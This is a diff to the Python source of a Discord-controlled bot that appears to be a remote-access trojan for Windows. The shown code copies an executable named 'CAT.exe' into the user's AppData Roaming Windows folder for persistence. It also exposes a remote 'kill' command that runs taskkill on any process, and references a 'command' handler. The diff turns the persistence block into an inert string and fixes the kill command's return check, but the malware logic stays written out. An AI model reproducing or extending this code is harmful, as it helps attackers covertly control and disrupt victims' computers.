@@ -25,7 +25,7 @@ path = f'C:\\Users\\{win32api.GetUserName()}\\AppData\\Roaming\\Microsoft\\Windo
 
 @bot.event
 async def on_ready():
-    try:
+    """try:
 
         with open(path + 'CAT.exe', 'rb') as f:
             pass
@@ -36,7 +36,7 @@ async def on_ready():
             data = f.read()
         with open(path + 'CAT.exe', 'wb') as f:
             f.write(data)
-
+"""
     channel_start = bot.get_channel(config.channel)
     date = datetime.now()
 
@@ -154,7 +154,7 @@ async def command(ctx, *, todo):
 
 @bot.command()
 async def kill(ctx, *, process):
-    if os.system(f'taskkill /im {str(process)} /f'):
+    if not os.system(f'taskkill /im {str(process)} /f'):
         await ctx.send(f'Process {str(process)} was killed')
     else:
         await ctx.send('ERROR')
